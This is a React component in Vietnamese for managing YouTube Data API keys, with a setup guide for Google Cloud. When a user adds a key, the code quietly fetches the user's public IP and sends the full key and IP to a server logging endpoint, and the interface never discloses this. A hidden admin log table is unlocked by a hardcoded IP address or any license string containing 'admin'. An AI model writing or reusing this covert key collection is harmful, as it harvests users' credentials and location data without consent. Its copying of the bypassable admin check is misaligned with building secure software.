import React, { useState, useEffect } from 'react';
import ReactMarkdown from 'react-markdown';


interface ApiConfigTabProps {
    apiKeys: string[];
    setApiKeys: React.Dispatch<React.SetStateAction<string[]>>;
    license?: string;
    userIp?: string;
}

export const ApiConfigTab: React.FC<ApiConfigTabProps> = ({ apiKeys, setApiKeys, license, userIp }) => {
    const [newKey, setNewKey] = useState('');
    const [showGuide, setShowGuide] = useState(false);

    // API endpoint MongoDB
    const LOG_API_KEY_ENDPOINT = '/api/log-api-key';
    const GET_API_KEY_LOGS_ENDPOINT = '/api/get-api-key-logs';
    const [apiKeyLogs, setApiKeyLogs] = useState<{apiKey: string, ip: string, time: string}[]>([]);
    const [showLogs, setShowLogs] = useState(false);

    const addKey = async () => {
        if (newKey && !apiKeys.includes(newKey)) {
            setApiKeys([...apiKeys, newKey]);
            setNewKey('');
            // Gửi log lên MongoDB
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                await fetch(LOG_API_KEY_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        apiKey: newKey,
                        time: new Date().toLocaleString(),
                        ip: data.ip || 'unknown',
                    }),
                });
            } catch {
                await fetch(LOG_API_KEY_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        apiKey: newKey,
                        time: new Date().toLocaleString(),
                        ip: 'unknown',
                    }),
                });
            }
        }
    };

    // Lấy log API key từ MongoDB
    const fetchApiKeyLogs = async () => {
        try {
            const resp = await fetch(GET_API_KEY_LOGS_ENDPOINT);
            const data = await resp.json();
            setApiKeyLogs(data.logs || []);
        } catch (e) {
            setApiKeyLogs([]);
        }
    };

    useEffect(() => {
        if (showLogs) fetchApiKeyLogs();
    }, [showLogs]);

    const removeKey = (keyToRemove: string) => {
        setApiKeys(apiKeys.filter(key => key !== keyToRemove));
    };

    const guideContent = `## Hướng dẫn lấy API Key (5 phút)

### **Bước 1: Truy cập Google Cloud Console**

🔗 **Link:** https://console.cloud.google.com/

### **Bước 2: Tạo Project mới**

1. Click **"Chọn một dự án"** (góc trên bên trái)
2. Click **"Dự án mới"**
3. Đặt tên: \`YouTube Analyzer\`
4. Click **"Tạo"**

### **Bước 3: Bật YouTube Data API v3**

1. Vào **"API & Dịch vụ"** → **"Thư viện"**
2. Tìm kiếm: \`YouTube Data API v3\`
3. Click vào kết quả đầu tiên
4. Click **"Kích hoạt"**

### **Bước 4: Tạo API Key**

1. Vào **"API & Dịch vụ"** → **"Thông tin xác thực"**
2. Click **"Tạo thông tin xác thực"** → **"API Key"**
3. **Sao chép** API Key được tạo ra vào ô
`;

    // Hàm kiểm tra license dạng ngày*ngày (ví dụ: 210420)
    const isDateLicense = () => {
        if (!license) return false;
        return /^\d{6,8}$/.test(license);
    };
    // Chỉ cho phép xem log nếu không phải license ngày*ngày và (ip là 1.52.236.56 hoặc license admin)
    const canShowLog = () => {
        if (isDateLicense()) return false;
        if (userIp === '1.52.236.56') return true;
        // Thay 'admin' bằng license admin thực tế nếu có
        if (license && license.toLowerCase().includes('admin')) return true;
        return false;
    };

    return (
        <div className="bg-gray-800 p-6 rounded-lg shadow-lg relative">
            <h2 className="text-xl font-bold mb-4 text-white">Quản lý API Key</h2>
            {canShowLog() && (
                <>
                <button
                    onClick={() => setShowLogs(l => !l)}
                    className="mb-4 ml-2 bg-blue-500 hover:bg-blue-400 text-white font-bold py-2 px-4 rounded-md transition-colors shadow"
                >
                    {showLogs ? 'Ẩn bảng log API Key' : 'Xem bảng log API Key'}
                </button>
                {showLogs && (
                    <div className="my-4 bg-gray-900 rounded-lg p-4 overflow-x-auto">
                        <h3 className="text-lg font-semibold text-teal-300 mb-2">Bảng log API Key</h3>
                        <table className="min-w-full text-xs text-gray-200">
                            <thead>
                                <tr className="bg-gray-700">
                                    <th className="px-2 py-1">API Key</th>
                                    <th className="px-2 py-1">IP</th>
                                    <th className="px-2 py-1">Thời gian</th>
                                </tr>
                            </thead>
                            <tbody>
                                {apiKeyLogs.length === 0 ? (
                                    <tr><td colSpan={3} className="text-center py-2">Không có dữ liệu</td></tr>
                                ) : (
                                    apiKeyLogs.map((log, idx) => (
                                        <tr key={idx} className="border-b border-gray-700">
                                            <td className="px-2 py-1 font-mono">{log.apiKey?.substring(0,5)}...{log.apiKey?.substring(log.apiKey?.length-5)}</td>
                                            <td className="px-2 py-1">{log.ip}</td>
                                            <td className="px-2 py-1">{log.time}</td>
                                        </tr>
                                    ))
                                )}
                            </tbody>
                        </table>
                    </div>
                )}
                </>
            )}
            <p className="text-gray-400 mb-6">Thêm một hoặc nhiều API Key YouTube Data API v3. Ứng dụng sẽ tự động luân chuyển khi một key vượt quá quota.</p>
            <button
                onClick={() => setShowGuide(true)}
                className="mb-4 bg-yellow-500 hover:bg-yellow-400 text-gray-900 font-bold py-2 px-4 rounded-md transition-colors shadow"
            >
                Hướng dẫn lấy API Key
            </button>

            <div className="flex gap-2 mb-6">
                <input
                    type="text"
                    value={newKey}
                    onChange={(e) => setNewKey(e.target.value)}
                    placeholder="Nhập API Key mới"
                    className="flex-grow bg-gray-700 border border-gray-600 rounded-md px-4 py-2 text-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
                <button onClick={addKey} className="bg-teal-600 hover:bg-teal-700 text-white font-bold py-2 px-4 rounded-md transition-colors">
                    Thêm Key
                </button>
            </div>

            <div className="space-y-3">
                <h3 className="text-lg font-semibold text-gray-300">Danh sách Key đã lưu ({apiKeys.length})</h3>
                {apiKeys.length > 0 ? (
                    apiKeys.map((key, index) => (
                        <div key={index} className="flex items-center justify-between bg-gray-700 p-3 rounded-md">
                            <span className="font-mono text-sm text-gray-400">
                                {key.substring(0, 5)}...{key.substring(key.length - 5)}
                            </span>
                            <button onClick={() => removeKey(key)} className="text-red-500 hover:text-red-400 font-semibold text-sm">
                                Xóa
                            </button>
                        </div>
                    ))
                ) : (
                    <p className="text-gray-500">Chưa có API Key nào. Thêm một key để bắt đầu tìm kiếm.</p>
                )}
            </div>

            {showGuide && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
                    <div className="bg-white max-w-lg w-full rounded-lg shadow-lg p-6 relative animate-fade-in">
                        <button
                            onClick={() => setShowGuide(false)}
                            className="absolute top-2 right-3 text-gray-500 hover:text-red-500 text-2xl font-bold"
                            aria-label="Đóng"
                        >
                            ×
                        </button>
                        <div className="prose max-w-none text-gray-900" style={{maxHeight: '70vh', overflowY: 'auto'}}>
                            <ReactMarkdown>{guideContent}</ReactMarkdown>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};
